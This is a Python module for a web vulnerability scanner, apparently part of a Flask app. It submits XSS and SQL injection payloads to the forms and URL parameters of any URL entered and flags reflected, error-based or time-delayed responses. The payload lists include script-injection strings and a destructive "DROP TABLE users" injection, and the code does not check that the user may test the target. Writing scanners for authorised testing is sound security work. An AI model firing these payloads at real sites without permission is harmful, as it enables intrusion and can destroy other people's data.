import requests
import time
from flask import flash
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin, urlparse, parse_qs
import validators

HEADERS = {
    "User-Agent": "Mozilla/5.0 (compatible; SQLiScanner/1.0; +https://yourtool.example)"
}

class Scanner:
    def __init__(self, url):
        self.url = url

    def validateUrl(self):
        if not self.url:
            return False
        if not self.url.startswith(('http://', 'https://')):
            flash('URL must start with either "https://" or "http://" ')
            return False
        if not validators.url(self.url):
            flash('Invalid URL format!')
            return False
        return True

    def getAllForms(self):
        try:
            response = requests.get(self.url, headers=HEADERS, timeout=5)
            response.raise_for_status()
            soup = bs(response.content, 'html.parser')
            return soup.find_all('form')
        except Exception as e:
            flash(f"Error retrieving forms from URL: {str(e)}")
            return []

    def getFormDetails(self, form):
        details = {}
        action = form.attrs.get('action', '').lower()
        method = form.attrs.get('method', 'get').lower()
        inputs = []
        for input_tag in form.find_all('input'):
            input_type = input_tag.attrs.get('type', 'text')
            input_name = input_tag.attrs.get('name')
            inputs.append({'type': input_type, 'name': input_name})
        details["action"] = action
        details["method"] = method
        details["inputs"] = inputs
        return details

    def submitForm(self, form_details, value):
        target_url = urljoin(self.url, form_details['action'])
        inputs = form_details['inputs']
        data = {}
        for input in inputs:
            if input['type'] in ['text', 'search']:
                input['value'] = value
            input_name = input.get('name')
            input_value = input.get('value')
            if input_name and input_value:
                data[input_name] = input_value
        flash(f"Payload testing to {target_url}\n Data: {data}")
        try:
            if form_details['method'] == 'post':
                return requests.post(target_url, data=data, headers=HEADERS, timeout=7)
            else:
                return requests.get(target_url, params=data, headers=HEADERS, timeout=7)
        except Exception as e:
            flash(f"Request error: {str(e)}")
            return None

    def scanXss(self):
        forms = self.getAllForms()
        results = {'url': self.url, 'form_count': len(forms), 'vulnerable_forms': []}
        XSS_PAYLOADS = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
            "<script>alert('Hope your site is secure =]')</script>"
        ]
        for form in forms:
            form_detail = self.getFormDetails(form)
            for payload in XSS_PAYLOADS:
                try:
                    response = self.submitForm(form_detail, payload)
                    if response and payload in response.text:
                        results['vulnerable_forms'].append({
                            'details': form_detail,
                            'action': urljoin(self.url, form_detail['action'])
                        })
                        break
                except Exception as e:
                    flash(f'Testing form error: {payload} | {str(e)}')
                    continue
        return results

    def scanSqli(self):
        results = {'url': self.url, 'param_count': 0, 'vulnerable_params': []}
        SQLI_PAYLOADS = [
            "'", "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--", "'; DROP TABLE users--", "' OR SLEEP(3)--"
        ]

        parsed = urlparse(self.url)
        query_params = parse_qs(parsed.query)

        # ✅ Case 1: URL parameter have
        if query_params:
            results['param_count'] = len(query_params)
            for param in query_params:
                for payload in SQLI_PAYLOADS:
                    test_params = query_params.copy()
                    test_params[param] = payload
                    test_query = "&".join([f"{k}={v}" for k, v in test_params.items()])
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"

                    try:
                        start_time = time.time()
                        response = requests.get(test_url, headers=HEADERS, timeout=10)
                        elapsed = time.time() - start_time
                        content = response.text.lower()

                        if any(error in content for error in [
                            "sql syntax", "mysql_fetch", "odbc_exec", "unclosed quotation mark",
                            "unterminated string", "syntax error"
                        ]):
                            results['vulnerable_params'].append({
                                'name': param,
                                'payload': payload
                            })
                            break
                        elif elapsed > 2.5:
                            results['vulnerable_params'].append({
                                'name': param,
                                'payload': payload + " (blind)"
                            })
                            break
                    except Exception as e:
                        flash(f"SQLi test error on param '{param}': {str(e)}")

        # ✅ Case 2: <form> based GET/POST auto scan
        try:
            forms = self.getAllForms()
            for form in forms:
                form_details = self.getFormDetails(form)
                for input in form_details['inputs']:
                    param_name = input.get('name')
                    if not param_name:
                        continue

                    for payload in SQLI_PAYLOADS:
                        data = {param_name: payload}
                        target_url = urljoin(self.url, form_details['action'])

                        try:
                            start_time = time.time()
                            if form_details['method'] == 'post':
                                response = requests.post(target_url, data=data, headers=HEADERS, timeout=10)
                            else:
                                response = requests.get(target_url, params=data, headers=HEADERS, timeout=10)
                            elapsed = time.time() - start_time
                            content = response.text.lower()

                            if any(error in content for error in [
                                "sql syntax", "mysql_fetch", "odbc_exec", "unclosed quotation mark",
                                "unterminated string", "syntax error"
                            ]):
                                results['vulnerable_params'].append({
                                    'name': param_name,
                                    'payload': payload
                                })
                                break
                            elif elapsed > 2.5:
                                results['vulnerable_params'].append({
                                    'name': param_name,
                                    'payload': payload + " (blind)"
                                })
                                break
                        except Exception as e:
                            flash(f"{form_details['method'].upper()} SQLi test error: {str(e)}")

        except Exception as e:
            flash(f"Error during form-based SQLi scanning: {str(e)}")

        results['param_count'] = len(results['vulnerable_params'])
        return results
